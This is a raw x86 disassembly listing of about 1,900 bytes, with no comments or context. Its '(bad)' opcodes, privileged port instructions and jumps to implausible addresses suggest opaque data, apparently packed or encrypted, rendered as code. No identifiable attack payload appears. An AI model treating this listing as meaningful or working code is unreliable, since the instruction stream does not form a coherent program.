  42dd84:	addps  xmm0,XMMWORD PTR [ebx+0x24]
  42dd88:	leave  
  42dd89:	push   ecx
  42dd8a:	dec    ebx
  42dd8b:	and    al,0xd1
  42dd8d:	pushf  
  42dd8e:	jge    0x42dd4f
  42dd90:	hlt    
  42dd91:	sbb    eax,0xf5e5427f
  42dd96:	aas    
  42dd97:	adc    BYTE PTR [eax],bl
  42dd99:	cli    
  42dd9a:	sahf   
  42dd9b:	psrlw  mm1,QWORD PTR [ecx]
  42dd9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd9f:	(bad)  
  42dda0:	call   0x56f437a3
  42dda5:	out    0x7f,al
  42dda7:	out    dx,eax
  42dda8:	fs iret 
  42ddaa:	sub    eax,0x82f4000c
  42ddaf:	cli    
  42ddb0:	dec    DWORD PTR [eax+ebx*8-0x6197bb78]
  42ddb7:	loope  0x42dde8
  42ddb9:	sar    DWORD PTR [edx],1
  42ddbb:	and    al,0x24
  42ddbd:	sub    al,0x83
  42ddbf:	ds and al,0x74
  42ddc2:	dec    esi
  42ddc3:	add    esi,0x0
  42ddc6:	add    BYTE PTR [eax],al
  42ddc8:	add    BYTE PTR [eax],al
  42ddca:	je     0x42dde2
  42ddcc:	ret    0x83ff
  42ddcf:	dec    eax
  42ddd0:	pop    esi
  42ddd1:	mov    DWORD PTR [eax],ebx
  42ddd3:	sahf   
  42ddd4:	push   ds
  42ddd5:	call   0x38afd5
  42ddda:	xlat   BYTE PTR ds:[ebx]
  42dddb:	inc    edx
  42dddc:	and    al,0x18
  42ddde:	cdq    
  42dddf:	outs   dx,BYTE PTR ds:[si]
  42dde1:	or     esp,DWORD PTR [edi+0x430161fe]
  42dde7:	adc    bh,BYTE PTR [ebx+0x64]
  42ddea:	push   0x1c69fff6
  42ddef:	or     BYTE PTR [ecx],al
  42ddf1:	lea    ebx,[eax-0x66]
  42ddf4:	inc    edx
  42ddf5:	push   eax
  42ddf6:	xchg   ecx,eax
  42ddf7:	in     eax,dx
  42ddf8:	and    edi,DWORD PTR [eax]
  42ddfa:	xor    al,0x63
  42ddfc:	nop
  42ddfd:	(bad)  
  42ddfe:	and    ecx,DWORD PTR [ebp-0x18]
  42de01:	cmp    al,0x2c
  42de03:	jno    0x42ddfa
  42de05:	xor    esi,DWORD PTR [edi-0x2fdbc0dc]
  42de0b:	and    al,0x6b
  42de0d:	add    al,0x57
  42de0f:	mov    eax,0x35e4ce81
  42de14:	std    
  42de15:	inc    BYTE PTR [ebx+0x24]
  42de18:	repz cmp eax,DWORD PTR [edi+0x0]
  42de1c:	test   DWORD PTR [edx+0x23],eax
  42de1f:	jo     0x42de16
  42de21:	neg    al
  42de23:	popf   
  42de24:	push   cs
  42de25:	adc    al,cl
  42de27:	lea    eax,ss:[ebp+esi*2-0x9]
  42de2c:	dec    DWORD PTR [edi+0x0]
  42de2f:	add    BYTE PTR [eax],al
  42de31:	add    BYTE PTR [eax],al
  42de33:	cld    
  42de34:	push   edi
  42de35:	loop   0x42de46
  42de37:	popf   
  42de38:	xchg   ebx,eax
  42de39:	lods   eax,DWORD PTR ds:[esi]
  42de3a:	cld    
  42de3b:	sbb    BYTE PTR [edi],0xbf
  42de3e:	jae    0x42de79
  42de40:	inc    ebx
  42de41:	in     eax,0xfe
  42de43:	jo     0x42de19
  42de45:	add    edi,0x24433295
  42de4b:	test   DWORD PTR [esi],edx
  42de4d:	inc    ebx
  42de4e:	and    al,0x85
  42de50:	imul   ebx,DWORD PTR [ecx+eax*1],0xffffffdf
  42de54:	lahf   
  42de55:	inc    esi
  42de56:	call   0xfaf37974
  42de5b:	inc    edx
  42de5c:	das    
  42de5d:	jecxz  0x42de6a
  42de5f:	dec    ebp
  42de60:	mov    eax,0x1832fc9a
  42de65:	add    BYTE PTR [eax],ah
  42de67:	dec    ebx
  42de68:	fadd   DWORD PTR [ebx]
  42de6a:	adc    BYTE PTR [ebp-0xa000165],cl
  42de70:	inc    eax
  42de71:	sbb    BYTE PTR [ecx-0x4e8004f],cl
  42de77:	pusha  
  42de78:	fist   DWORD PTR [edi]
  42de7a:	inc    eax
  42de7b:	jne    0x42de93
  42de7d:	cmp    BYTE PTR [ecx+ebp*2],ah
  42de80:	ret    
  42de81:	inc    eax
  42de82:	sti    
  42de83:	lock push ebx
  42de85:	pushf  
  42de86:	dec    esp
  42de87:	jecxz  0x42de5f
  42de89:	out    0x13,eax
  42de8b:	ins    DWORD PTR es:[edi],dx
  42de8c:	lsl    ebp,ax
  42de8f:	bound  ebp,QWORD PTR [eax-0x21340550]
  42de95:	out    0x13,eax
  42de97:	add    BYTE PTR [eax],al
  42de99:	add    BYTE PTR [eax],al
  42de9b:	add    BYTE PTR [esi-0x59],dh
  42de9e:	call   0x4472940a
  42dea3:	add    ch,cl
  42dea5:	mov    eax,ds:0x1fb2fb21
  42deaa:	dec    eax
  42deab:	and    al,0x81
  42dead:	add    dl,cl
  42deaf:	add    esi,DWORD PTR [ebp+0x2]
  42deb2:	imul   edx,ebx,0x3488092
  42deb8:	and    eax,0x3a54e818
  42debd:	push   ecx
  42debe:	inc    edx
  42debf:	pop    ss
  42dec0:	sbb    DWORD PTR [edx],edx
  42dec2:	test   eax,0x3b0d9203
  42dec7:	dec    eax
  42dec8:	cdq    
  42dec9:	push   cs
  42deca:	in     eax,0x37
  42decc:	js     0x42dee8
  42dece:	jmp    0x8ec553d6
  42ded3:	pop    ss
  42ded4:	pop    esi
  42ded5:	push   cs
  42ded6:	test   eax,0x5e02b517
  42dedb:	inc    eax
  42dedc:	xchg   ecx,eax
  42dedd:	or     bh,BYTE PTR [esi+0x6df8c6bc]
  42dee3:	add    edx,ebx
  42dee5:	add    edx,esi
  42dee7:	adc    edi,esp
  42dee9:	inc    esi
  42deea:	lds    ecx,FWORD PTR [ebx]
  42deec:	clc    
  42deed:	ds or  eax,0x24bbc54c
  42def3:	call   0x449dd142
  42def8:	jne    0x42deb5
  42defa:	and    al,0xe8
  42defc:	push   0x56
  42defe:	xor    eax,0x44
  42df03:	add    BYTE PTR [eax],al
  42df05:	jne    0x42deaa
  42df07:	rcl    DWORD PTR [edi],cl
  42df09:	imul   eax,DWORD PTR [edx-0x17],0x50
  42df0d:	dec    edi
  42df0e:	inc    edi
  42df0f:	pop    esi
  42df10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df11:	dec    ecx
  42df12:	mov    edi,0xfe99479a
  42df17:	out    0x59,eax
  42df19:	repnz mov cl,0xa9
  42df1c:	or     DWORD PTR [ecx],esp
  42df1e:	xor    BYTE PTR [ecx],ch
  42df20:	add    al,0x41
  42df22:	cld    
  42df23:	sbb    bl,BYTE PTR [ebp+ecx*4-0xc4f864d]
  42df2a:	mov    esp,0xffbb16ff
  42df2f:	call   FWORD PTR [ecx]
  42df31:	dec    edi
  42df32:	jnp    0x42df23
  42df34:	mov    esi,0x2f8663a9
  42df39:	mov    eax,ds:0xee562ecc
  42df3e:	in     al,0xfb
  42df40:	dec    edi
  42df41:	(bad)
  42df44:	mov    ebp,0xa6c97b66
  42df49:	fdivrp st(0),st
  42df4b:	sti    
  42df4c:	aaa    
  42df4d:	and    eax,0x22b4beec
  42df52:	in     al,dx
  42df53:	neg    BYTE PTR [edx+edi*2-0x74edff8e]
  42df5a:	jnp    0x42df5d
  42df5c:	push   ss
  42df5d:	xchg   BYTE PTR [esi],cl
  42df5f:	push   eax
  42df60:	add    DWORD PTR [edx-0x3ef90549],edi
  42df66:	xchg   ebx,eax
  42df67:	ss cli 
  42df69:	add    BYTE PTR [eax],al
  42df6b:	add    BYTE PTR [eax],al
  42df6d:	add    BYTE PTR [ebx+0xeed65df],al
  42df73:	ret    0xeec9
  42df76:	(bad)  
  42df78:	mov    esi,0x17796d5d
  42df7d:	shl    BYTE PTR [edi-0x2d],cl
  42df80:	mov    edi,0x22f3612
  42df85:	pusha  
  42df86:	add    DWORD PTR [edi+esi*8-0x2e],edi
  42df8a:	add    DWORD PTR [ecx-0x18],edx
  42df8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42df8e:	mov    ebx,0x23fafaa7
  42df93:	in     al,dx
  42df94:	div    BYTE PTR [edi*2+0x3892bfd4]
  42df9b:	sbb    al,0x8
  42df9d:	xchg   ecx,eax
  42df9e:	add    edi,DWORD PTR [ecx+0x63de96fa]
  42dfa4:	jae    0x42df88
  42dfa6:	mov    bl,0xa2
  42dfa8:	add    BYTE PTR [eax],0x48
  42dfab:	add    BYTE PTR ds:[ecx+0x2e2fa74],cl
  42dfb2:	out    dx,eax
  42dfb3:	mov    esi,0xa3a1c331
  42dfb8:	cmc    
  42dfb9:	aaa    
  42dfba:	inc    esp
  42dfbb:	js     0x42df85
  42dfbd:	(bad)  
  42dfbe:	cmp    ecx,DWORD PTR [ebx-0x18]
  42dfc1:	xchg   esp,eax
  42dfc2:	pop    edx
  42dfc3:	push   ebx
  42dfc4:	cmc    
  42dfc5:	jmp    0x42e014
  42dfc7:	daa    
  42dfc8:	jmp    0x42dfb2
  42dfca:	mov    edi,0x77fff5f5
  42dfcf:	mov    edi,0x96e
  42dfd4:	add    BYTE PTR [eax],al
  42dfd6:	add    BYTE PTR [edx*1+0xa41ff00],cl
  42dfdd:	or     eax,DWORD PTR [eax+0x4c]
  42dfe0:	sbb    al,0xba
  42dfe2:	pop    edi
  42dfe3:	sbb    cl,BYTE PTR [ebp-0x45]
  42dfe6:	mov    al,0x5d
  42dfe8:	les    ecx,FWORD PTR [edx]
  42dfea:	add    BYTE PTR [edx+0x4a],ah
  42dfed:	and    al,0x4
  42dfef:	dec    ebp
  42dff0:	cmp    BYTE PTR [ebx-0x5bf76c0f],al
  42dff6:	mov    esp,ds
  42dff8:	add    eax,0x7e020674
  42dffd:	pop    ebx
  42dffe:	into   
  42dfff:	sbb    esi,DWORD PTR [ecx-0x7f]
  42e002:	(bad)  
  42e003:	pop    edx
  42e004:	(bad)  
  42e005:	(bad)  
  42e006:	call   DWORD PTR [edi-0x317a83c9]
  42e00c:	fst    DWORD PTR [edi]
  42e00e:	mov    edx,DWORD PTR [edx-0x2]
  42e011:	or     BYTE PTR [esi-0x50],0x34
  42e015:	push   eax
  42e016:	push   ecx
  42e017:	mov    ah,0x29
  42e019:	mov    esi,edi
  42e01b:	sbb    ebp,DWORD PTR [ebp+0xb806840]
  42e021:	outs   dx,DWORD PTR ds:[esi]
  42e022:	sub    DWORD PTR [ebp+0x47],esp
  42e025:	push   0x7f31758b
  42e02a:	dec    edx
  42e02c:	stos   DWORD PTR es:[edi],eax
  42e02d:	xchg   DWORD PTR [edi-0x768a5db7],edi
  42e033:	icebp  
  42e034:	stos   DWORD PTR es:[edi],eax
  42e035:	(bad)  
  42e036:	dec    DWORD PTR [edx-0x6]
  42e039:	cmp    BYTE PTR [ecx+0x0],0x0
  42e03d:	add    BYTE PTR [eax],al
  42e03f:	add    BYTE PTR [ecx],dl
  42e041:	sti    
  42e042:	stos   BYTE PTR es:[edi],al
  42e043:	jb     0x42e0be
  42e045:	xor    ecx,DWORD PTR [edi+ebp*2-0x65]
  42e049:	inc    eax
  42e04a:	dec    edx
  42e04b:	test   DWORD PTR [ebp+0x74affdbf],esi
  42e051:	in     al,dx
  42e052:	lock mov edi,0xeb757eb6
  42e058:	out    dx,al
  42e059:	data16 not BYTE PTR [ecx-0x2]
  42e05d:	fxam   
  42e05f:	inc    ecx
  42e060:	int    0x57
  42e062:	adc    BYTE PTR [edi-0x8a6048],al
  42e068:	jne    0x42e093
  42e06a:	ja     0x42e06b
  42e06c:	push   edx
  42e06d:	stos   DWORD PTR es:[edi],eax
  42e06e:	outs   dx,BYTE PTR ds:[esi]
  42e06f:	add    BYTE PTR [edx+eiz*4+0x3],bl
  42e073:	add    BYTE PTR [ebp+0x2c],dh
  42e076:	sub    eax,0xae177574
  42e07b:	xchg   BYTE PTR [eax-0x7278b241],bh
  42e081:	js     0x42e0f8
  42e083:	jl     0x42e00a
  42e085:	adc    ch,BYTE PTR [ebx]
  42e087:	or     BYTE PTR [edx+edx*2],cl
  42e08a:	add    eax,DWORD PTR [eax]
  42e08c:	jne    0x42e06a
  42e08e:	lods   al,BYTE PTR ds:[esi]
  42e08f:	je     0x42e10e
  42e091:	ds inc edx
  42e093:	cmp    BYTE PTR [ebp+0xd184216],ah
  42e099:	std    
  42e09a:	sahf   
  42e09b:	stc    
  42e09c:	repnz test eax,0x739e0841
  42e0a2:	jne    0x42e0e5
  42e0a4:	add    BYTE PTR [eax],al
  42e0a6:	add    BYTE PTR [eax],al
  42e0a8:	add    BYTE PTR [edx+0x612ccd02],dl
  42e0ae:	or     bl,ch
  42e0b0:	or     BYTE PTR [esi-0x79],bh
  42e0b3:	mov    dh,0x4
  42e0b5:	jne    0x42e0b9
  42e0b7:	les    ebp,FWORD PTR gs:[edi-0x7a]
  42e0bb:	arpl   WORD PTR [esi*2+0x29466e02],ax
  42e0c2:	dec    edx
  42e0c3:	and    DWORD PTR [eax],edi
  42e0c5:	and    al,0x4a
  42e0c7:	and    ebp,edi
  42e0c9:	stc    
  42e0ca:	test   eax,ebp
  42e0cc:	add    esi,DWORD PTR [ebp-0x25]
  42e0cf:	mov    ds:0x96867e1b,al
  42e0d4:	add    al,0x75
  42e0d6:	add    dh,BYTE PTR [esi-0x65f5f654]
  42e0dc:	lods   al,BYTE PTR ds:[esi]
  42e0dd:	popa   
  42e0de:	dec    esi
  42e0df:	rol    DWORD PTR [ebx+0x75],cl
  42e0e2:	mov    ebp,DWORD PTR [ebx-0x233915e9]
  42e0e8:	jp     0x42e074
  42e0ea:	mov    DWORD PTR [ebx+0x19e252fb],esp
  42e0f0:	lods   eax,DWORD PTR ds:[esi]
  42e0f1:	dec    edi
  42e0f2:	xchg   DWORD PTR [eax],ebp
  42e0f4:	std    
  42e0f5:	test   BYTE PTR [edi+0x2c7503e8],0xe8
  42e0fc:	jle    0x42e0ba
  42e0fe:	es xchg ecx,eax
  42e100:	arpl   si,di
  42e102:	inc    edx
  42e103:	jmp    0x14988b4
  42e108:	(bad)  
  42e109:	nop
  42e10a:	mov    al,ds:0x86e1
  42e10f:	add    BYTE PTR [eax],al
  42e111:	add    dl,bl
  42e113:	push   ss
  42e114:	pusha  
  42e115:	lods   eax,DWORD PTR ds:[esi]
  42e116:	test   BYTE PTR [edx],ah
  42e118:	pop    esi
  42e119:	inc    ebp
  42e11a:	popf   
  42e11b:	lahf   
  42e11c:	push   edx
  42e11d:	push   eax
  42e11e:	cli    
  42e11f:	imul   DWORD PTR [ebp+0x3e]
  42e122:	imul   ebp,DWORD PTR [edx-0x6011d659],0x13b66cff
  42e12c:	pop    esi
  42e12d:	push   0xffffff99
  42e12f:	push   es
  42e130:	add    BYTE PTR [edx-0x75],dh
  42e133:	bnd ret 0x8d27
  42e137:	add    eax,0xa776e900
  42e13c:	push   ss
  42e13d:	bound  edi,QWORD PTR [eax]
  42e13f:	sbb    ah,BYTE PTR [edi]
  42e141:	scas   al,BYTE PTR es:[edi]
  42e142:	xor    dh,0xfa
  42e145:	not    DWORD PTR [esi-0x79]
  42e148:	dec    esp
  42e149:	in     eax,0xd9
  42e14b:	adc    DWORD PTR [edx+eiz*2-0x37],ebx
  42e14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e150:	xchg   ecx,eax
  42e151:	jecxz  0x42e11c
  42e153:	pushf  
  42e154:	sub    DWORD PTR [ecx],0x4a
  42e157:	shl    DWORD PTR [ebp-0x17],cl
  42e15a:	or     ecx,DWORD PTR [ecx+0x18]
  42e15d:	inc    ecx
  42e15e:	xor    al,0x96
  42e160:	stc    
  42e161:	inc    esi
  42e162:	repz mov eax,0x9c51640a
  42e168:	cli    
  42e169:	ss in  eax,dx
  42e16b:	inc    ecx
  42e16c:	je     0x42e1d8
  42e16e:	push   cs
  42e16f:	add    bh,BYTE PTR [edx-0xd]
  42e172:	cmc    
  42e173:	xchg   esi,eax
  42e174:	add    al,0x9c
  42e176:	add    BYTE PTR [eax],al
  42e178:	add    BYTE PTR [eax],al
  42e17a:	add    BYTE PTR [ebx-0x79],bh
  42e17d:	inc    esp
  42e17e:	std    
  42e17f:	push   edi
  42e180:	div    DWORD PTR [edi+0x27149]
  42e186:	ret    0x2ab0
  42e189:	push   ss
  42e18a:	sub    eax,esp
  42e18c:	pop    esi
  42e18d:	pop    edx
  42e18e:	xchg   edx,eax
  42e18f:	mov    eax,0x76d9be3d
  42e194:	lock mov edi,0xbfefe4d2
  42e19a:	sub    DWORD PTR [eax-0x585593be],edx
  42e1a0:	xchg   eax,esi
  42e1a2:	push   0x4f
  42e1a4:	cs (bad) 
  42e1a6:	(bad)  
  42e1a7:	cmp    DWORD PTR [edx],ecx
  42e1a9:	dec    edi
  42e1aa:	push   0xffffffde
  42e1ac:	sbb    DWORD PTR [ecx+0x5c],edi
  42e1af:	xor    al,0x32
  42e1b1:	jns    0x42e1f3
  42e1b3:	int3   
  42e1b4:	imul   ebp,DWORD PTR [ebp+0x4],0x4
  42e1b8:	ins    DWORD PTR es:[edi],dx
  42e1b9:	outs   dx,DWORD PTR ds:[esi]
  42e1ba:	(bad)  
  42e1bb:	repz dec edx
  42e1bd:	test   eax,eax
  42e1bf:	imul   eax,DWORD PTR [edx],0xc792c02a
  42e1c5:	add    DWORD PTR fs:[ecx-0x24],eax
  42e1c9:	xrstors [edx-0x6]
  42e1cd:	add    eax,DWORD PTR [eax]
  42e1cf:	pushf  
  42e1d0:	add    ch,al
  42e1d2:	aam    0x1f
  42e1d4:	ins    BYTE PTR es:[edi],dx
  42e1d5:	cmc    
  42e1d6:	mov    al,0x8d
  42e1d8:	dec    eax
  42e1d9:	mov    ebx,0x81550756
  42e1de:	inc    esi
  42e1df:	add    BYTE PTR [eax],al
  42e1e1:	add    BYTE PTR [eax],al
  42e1e3:	add    BYTE PTR [eax+0x7b744eda],dh
  42e1e9:	fiadd  WORD PTR [edi+0x75]
  42e1ec:	ja     0x42e1ee
  42e1ee:	cli    
  42e1ef:	mov    WORD PTR [edx],?
  42e1f1:	inc    esi
  42e1f2:	push   0x422554
  42e1f7:	jmp    FWORD PTR [ebx]
  42e1f9:	sahf   
  42e1fa:	loop   0x42e1b7
  42e1fc:	std    
  42e1fd:	imul   esi,ebp,0xffffff85
  42e200:	pushf  
  42e201:	rol    DWORD PTR [ebx],cl
  42e203:	xor    bl,BYTE PTR [ebp+edi*2-0x9e538cc]
  42e20a:	stc    
  42e20b:	dec    DWORD PTR [edx+eax*1-0x1d]
  42e20f:	sbb    BYTE PTR [edi-0x9f3dbbe],ah
  42e215:	push   es
  42e216:	lea    ecx,[esi+0x3c]
  42e219:	pop    ds
  42e21a:	inc    ecx
  42e21b:	jo     0x42e1e8
  42e21d:	inc    ebx
  42e21e:	ins    BYTE PTR es:[edi],dx
  42e21f:	add    bl,BYTE PTR [edx+eax*1]
  42e222:	add    al,ch
  42e224:	jne    0x42e252
  42e226:	mov    dl,0xf9
  42e228:	add    cl,ch
  42e22a:	sub    ah,BYTE PTR [eiz*2-0xda3d6ea]
  42e231:	xlat   BYTE PTR ds:[ebx]
  42e232:	fisttp WORD PTR [edi]
  42e234:	jmp    0xa5da:0x62e7ffdc
  42e23b:	cli    
  42e23c:	loop   0x42e201
  42e23e:	or     eax,eax
  42e240:	retf   0x45c3
  42e243:	pop    edx
  42e244:	mov    bh,0xa3
  42e246:	(bad)  
  42e247:	push   ecx
  42e248:	add    BYTE PTR [eax],al
  42e24a:	add    BYTE PTR [eax],al
  42e24c:	add    dh,ch
  42e24e:	jp     0x42e2c9
  42e250:	inc    ecx
  42e251:	dec    ecx
  42e252:	sar    DWORD PTR [ebx],cl
  42e254:	push   ebx
  42e255:	sub    dl,cl
  42e257:	sbb    al,0xfe
  42e259:	stc    
  42e25a:	xchg   ebp,eax
  42e25b:	inc    edx
  42e25c:	push   0x3e923d
  42e261:	call   0xa8ba:0x2ae7fabc
  42e268:	cli    
  42e269:	lock jmp 0x42e29b
  42e26c:	add    al,0x47
  42e26e:	jmp    0x42e209
  42e270:	pop    ds
  42e271:	mov    dl,0x6d
  42e273:	adc    bh,bh
  42e275:	jb     0x42e222
  42e277:	(bad)  
  42e278:	cli    
  42e279:	loope  0x42e28a
  42e27b:	adc    al,0x8d
  42e27d:	jecxz  0x42e20e
  42e27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e280:	jae    0x42e213
  42e282:	fwait
  42e283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e284:	jb     0x42e2ff
  42e286:	repz out dx,eax
  42e288:	jo     0x42e2d5
  42e28a:	hlt    
  42e28b:	lods   eax,DWORD PTR ds:[esi]
  42e28c:	xlat   BYTE PTR ds:[ebx]
  42e28d:	pop    esi
  42e28e:	jmp    0x42e23d
  42e290:	xlat   BYTE PTR ds:[ebx]
  42e291:	call   0x517a:0x7507c465
  42e298:	push   ebx
  42e299:	clc    
  42e29a:	adc    al,0xf7
  42e29c:	cs xor eax,0xe9a400e4
  42e2a2:	add    DWORD PTR [ecx],ebp
  42e2a4:	add    al,0x1d
  42e2a6:	push   DWORD PTR [eax-0x57]
  42e2a9:	jns    0xd1a9c2db
  42e2af:	lods   eax,DWORD PTR ds:[esi]
  42e2b0:	rol    DWORD PTR [eax],0x0
  42e2b3:	add    BYTE PTR [eax],al
  42e2b5:	add    BYTE PTR [esi+ebp*2+0x74],dh
  42e2b9:	inc    esp
  42e2ba:	jne    0x42e281
  42e2bc:	loope  0x42e32d
  42e2be:	inc    BYTE PTR [ecx-0x17]
  42e2c1:	jp     0x42e2ff
  42e2c3:	es pusha 
  42e2c5:	dec    edx
  42e2c6:	dec    ebp
  42e2c7:	mov    eax,DWORD PTR [edx+0x18]
  42e2ca:	mov    dh,0x43
  42e2cc:	sbb    DWORD PTR [ecx+esi*2],eax
  42e2cf:	add    ch,cl
  42e2d1:	sbb    eax,0x4c228b78
  42e2d6:	sbb    eax,0xfc302a8b
  42e2db:	cmp    edi,ebp
  42e2dd:	jp     0x42e2eb
  42e2df:	sub    al,0x3
  42e2e2:	jne    0x42e26f
  42e2e4:	dec    edx
  42e2e5:	sbb    BYTE PTR [edx-0x13851764],0x89
  42e2ec:	call   0xb51e57f4
  42e2f1:	fbstp  TBYTE PTR [edx+0x16]
  42e2f4:	lock push ebx
  42e2f6:	jle    0x42e30d
  42e2f8:	or     eax,0xf9440010
  42e2fd:	push   ebx
  42e2fe:	clc    
  42e2ff:	inc    ebx
  42e300:	fstp   DWORD PTR [ebx-0x56d54492]
  42e306:	fistp  DWORD PTR [edx-0x74add015]
  42e30c:	mov    edx,0x2a87ae2f
  42e311:	dec    ebp
  42e312:	pushf  
  42e313:	shl    al,0x3
  42e316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e317:	xchg   edi,esi
  42e319:	fwait
  42e31a:	add    BYTE PTR [eax],al
  42e31c:	add    BYTE PTR [eax],al
  42e31e:	add    BYTE PTR [ebx+0x2703e902],al
  42e324:	inc    edi
  42e325:	add    ch,cl
  42e327:	push   ds
  42e328:	add    esi,DWORD PTR [edi+eiz*8-0x3c]
  42e32c:	stos   BYTE PTR es:[edi],al
  42e32d:	pop    ebx
  42e32e:	mov    dl,0xdd
  42e330:	cwde   
  42e331:	xchg   BYTE PTR [edi-0x16fca344],ah
  42e337:	int    0x51
  42e339:	jg     0x42e324
  42e33b:	jbe    0x42e33f
  42e33d:	ret    
  42e33e:	out    dx,eax
  42e33f:	dec    edx
  42e340:	xchg   DWORD PTR [edi],edi
  42e342:	jmp    0x7d4b24fc
  42e347:	push   0xffffffdb
  42e349:	inc    eax
  42e34b:	int3   
  42e34c:	(bad)  
  42e34d:	cli    
  42e34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e34f:	sbb    eax,0xc4916412
  42e354:	(bad)  
  42e355:	cli    
  42e356:	xchg   esi,eax
  42e357:	mov    ch,0x41
  42e359:	or     BYTE PTR [ecx-0x520024c8],cl
  42e35f:	je     0x42e3c7
  42e361:	mov    ebp,DWORD PTR [ecx]
  42e363:	jno    0x42e3c0
  42e365:	push   esp
  42e366:	bound  ecx,QWORD PTR [edx]
  42e368:	xor    edx,DWORD PTR [ecx+0x62]
  42e36b:	arpl   WORD PTR [esi],cx
  42e36d:	dec    edi
  42e36e:	mov    edi,0x7a60aa25
  42e373:	fstp   QWORD PTR [eax-0x7c995b7a]
  42e379:	out    dx,eax
  42e37a:	pusha  
  42e37b:	dec    ebx
  42e37c:	sahf   
  42e37d:	out    0x9d,eax
  42e37f:	or     DWORD PTR [eax+0x72fa],ebx
  42e385:	add    BYTE PTR [eax],al
  42e387:	add    BYTE PTR [ebx+0xeac890a],dl
  42e38d:	xchg   cl,dh
  42e38f:	mov    ch,0xa9
  42e391:	lea    eax,[ebx-0x27]
  42e394:	push   ebx
  42e395:	mov    ds,WORD PTR [edx+0x27669]
  42e39b:	mov    ecx,0x9be7acc1
  42e3a0:	clc    
  42e3a1:	xchg   edi,eax
  42e3a2:	cli    
  42e3a3:	add    BYTE PTR [eax+0x2b456ebf],ah
  42e3a9:	in     eax,dx
  42e3aa:	sti    
  42e3ab:	mov    esp,edi
  42e3ad:	imul   esi,DWORD PTR [ebx+0xc],0x1646ac97
  42e3b4:	pop    esp
  42e3b5:	push   es
  42e3b6:	dec    edi
  42e3b7:	inc    edx
  42e3b9:	(bad)  
  42e3ba:	jl     0x42e3b8
  42e3bc:	sub    edx,ecx
  42e3be:	mul    DWORD PTR [esi-0x2d]
  42e3c1:	call   0x830f:0xd0bb2034
  42e3c8:	adc    eax,DWORD PTR [eax]
  42e3ca:	dec    edi
  42e3cb:	inc    DWORD PTR [edx]
  42e3cd:	(bad)  
  42e3ce:	jl     0x42e3c8
  42e3d0:	push   edi
  42e3d1:	inc    ecx
  42e3d2:	or     BYTE PTR [esi+0x23],ah
  42e3d5:	fwait
  42e3d6:	or     ecx,DWORD PTR [edx]
  42e3d8:	pop    edi
  42e3d9:	ret    0x8312
  42e3dc:	adc    eax,DWORD PTR [eax]
  42e3de:	mov    esi,0x31b7cc07
  42e3e3:	mov    DWORD PTR [edx+eax*4],esi
  42e3e6:	cli    
  42e3e7:	call   FWORD PTR [esi+ecx*1+0xeb00]
  42e3ee:	add    BYTE PTR [eax],al
  42e3f0:	add    BYTE PTR [ebp-0x737f529d],ch
  42e3f6:	(bad)  
  42e3f7:	jmp    edi
  42e3f9:	not    DWORD PTR [edi-0xb]
  42e3fc:	jmp    FWORD PTR [edi-0x3a]
  42e3ff:	sub    ecx,ecx
  42e401:	gs inc ecx
  42e403:	cld    
  42e404:	mov    DWORD PTR [ebx],edx
  42e406:	xchg   dl,bh
  42e408:	call   FWORD PTR [edi+edx*1+0x7e]
  42e40c:	test   BYTE PTR [esi+eax*1+0x0],bl
  42e410:	xadd   BYTE PTR [esi+0x57075e55],bh
  42e417:	mov    esp,0xe7855c0c
  42e41c:	or     BYTE PTR [ebp+0x3],ah
  42e41f:	idiv   edi
  42e421:	jne    0x42e413
  42e423:	push   eax
  42e424:	xchg   DWORD PTR [ecx+0x2d],ecx
  42e427:	cwde   
  42e428:	dec    edi
  42e429:	(bad)  
  42e42a:	jns    0x42e475
  42e42c:	das    
  42e42d:	dec    esi
  42e42e:	je     0x42e45a
  42e430:	je     0x42e3e7
  42e432:	stos   DWORD PTR es:[edi],eax
  42e433:	jnp    0x42e491
  42e435:	or     eax,0x67700fa9
  42e43a:	jmp    0x42e43f
  42e43c:	mov    DWORD PTR [eax+0x72bee54f],esi
  42e442:	daa    
  42e443:	sub    al,BYTE PTR [ecx]
  42e445:	jne    0x42e3f2
  42e447:	push   ss
  42e448:	sub    BYTE PTR [ecx-0x15],0x3
  42e44c:	push   eax
  42e44d:	jmp    0xb9ab:0x350d56ae
  42e454:	inc    esp
  42e455:	add    BYTE PTR [eax],al
  42e457:	add    BYTE PTR [eax],al
  42e459:	add    BYTE PTR [ecx+0x75fffeaa],dh
  42e45f:	adc    cl,BYTE PTR [eax-0x38]
  42e462:	cld    
  42e463:	(bad)  
  42e464:	mov    bh,0x88
  42e466:	and    BYTE PTR [ebx-0x1b],bl
  42e469:	mov    esi,0x1391f6a
  42e46e:	jne    0x42e41b
  42e470:	dec    ebp
  42e471:	lea    edi,[eax]
  42e473:	pop    edi
  42e474:	push   ebx
  42e475:	lea    esi,[eax]
  42e477:	jae    0x42e4cc
  42e479:	sti    
  42e47a:	lds    ebx,FWORD PTR [esi]
  42e47c:	mov    edi,0x4f8f80a
  42e481:	add    BYTE PTR [ebp+0x5c],dh
  42e484:	dec    ebp
  42e485:	dec    edi
  42e486:	or     eax,0x753f72d7
  42e48b:	dec    eax
  42e48c:	adc    BYTE PTR [ebp+eax*4+0x6d86fe6b],ch
  42e493:	adc    ch,BYTE PTR [eax]
  42e495:	loopne 0x42e435
  42e497:	aam    0xf1
  42e499:	xor    DWORD PTR [ebp-0x56],0xfffffffe
  42e49d:	jmp    FWORD PTR [edx+0x39102202]
  42e4a3:	repnz test al,0x3
  42e4a6:	in     al,dx
  42e4a7:	ds adc edx,ebp
  42e4aa:	sti    
  42e4ab:	or     BYTE PTR [ebp-0x62],ah
  42e4ae:	xor    bl,BYTE PTR [ecx-0x7d4ae418]
  42e4b4:	call   0x7f7896bc
  42e4b9:	add    DWORD PTR [ebp+0x36a02],ecx
  42e4bf:	add    BYTE PTR [eax],al
  42e4c1:	add    BYTE PTR [eax],al
  42e4c3:	jne    0x42e4fa
  42e4c5:	loop   0x42e4d6
  42e4c7:	jne    0x42e4b8
  42e4c9:	sub    BYTE PTR [esp+ebp*8],al
  42e4cc:	ds fucomp st(1)
  42e4cf:	mov    ebx,0x4177090d
